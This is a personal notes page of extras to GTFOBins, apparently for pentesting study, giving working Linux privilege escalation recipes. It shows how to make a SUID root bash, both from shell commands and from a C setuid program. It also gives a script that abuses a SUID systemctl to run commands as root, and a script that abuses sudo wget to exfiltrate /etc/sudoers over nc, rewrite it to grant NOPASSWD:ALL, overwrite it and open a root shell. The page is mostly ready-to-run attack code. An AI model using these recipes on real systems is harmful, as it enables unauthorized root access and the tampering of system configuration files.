# GTFOBins - extras

Some scripts, utilities, notes... complementary to GTFOBins.

<hr class="sep-both">

## ⚡ Create a root bash

<div class="row row-cols-md-2 mt-3"><div>

* ➡️ Version 1: with root executing 2 commands

```bash
$ cp /bin/bash /tmp/rootbash
```

Run **as root** (SUID executable, sudo...) the commands

```bash
$ chown root /tmp/rootbash
$ chmod +s /tmp/bash
```

Run the bash with `-p` and enjoy.

```bash
$ /tmp/rootbash -p
```
</div><div>

* ➡️ Version 2: with root executing an executable

```c
int main() {
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

```bash
$ gcc xxx.c -o rootbash
```

Then, you have to execute `rootbash` as root, either using a misconfiguration in sudo, SUID, cron jobs...

</div></div>

<hr class="sep-both">

## ⚡ SUID `systemctl` script

Description: this script makes it easier to run several commands using `systemctl`.

<div class="row row-cols-md-2 mt-4"><div>

Create a file `script.sh` with the contents below

```bash
TF=$(mktemp).service
echo "[Service]
Type=oneshot
ExecStart=/bin/sh -c '$@ > /tmp/output'
[Install]
WantedBy=multi-user.target" > $TF
systemctl -f link $TF
systemctl -f enable --now $TF
cat /tmp/output
```
</div><div>

Calls

```bash
$ chmod +x script.sh
$ ./script.sh id
$ ./script.sh ls -laR /root
```
</div></div>

<hr class="sep-both">

## ⚡ SUDO `wget` script

Description: this script automate privilege escalation using `wget`.

<div class="row row-cols-md-2"><div class="align-self-center">

It's quite easy to do it manually, but you need two machines (ex: your VM and the target). This script is complex because everything is done locally, without interacting with your VM!

* Will use `wget` to fetch `/etc/sudoers` and `nc` to grab the result

* Then, it will replace the line giving access to `wget` and give you the permission to run every command as root

* Then, we will start a python web server, and use `wget` with `-o` to remplace our new sudo file with the tampered one.

* Finally, the script run `sudo bash` and open your shell as root

⚠️ The script may mess with your sudoers file if something goes wrong. I destroyed my VM 7 times before managing to make the script work 🌳. If you understand the commands used in the script, use them one by one, and check the tampered sudoers file (output) BEFORE overriding the current one.
</div><div>

```bash
file=/etc/sudoers
port=4444
# todo: use mktemp
output=stolenfile

# Working in /tmp
cd /tmp
# -d and -q 0 to quit when connection is closed
nc -dlnp $port -q 0 > $output &
# -q = quiet, and -T 1 = close after one second
sudo wget -q --post-file=$file localhost:$port -T 1
# remove the HTTP headers
sed -i '1,9d' $output
# replace the command with find
sed -i "s/\($(whoami).*\)/$(whoami)  ALL=(ALL) NOPASSWD:ALL/g" $output
# create a web server
python3 -m http.server $port &
pid=$(echo $!)
sleep 1 # let the webserver start
# get the file then kill the webserver
# replace /etc/sudoers
sudo wget -q localhost:$port/$output -O $file && kill $pid
# open the root shell
sudo bash
```
</div></div>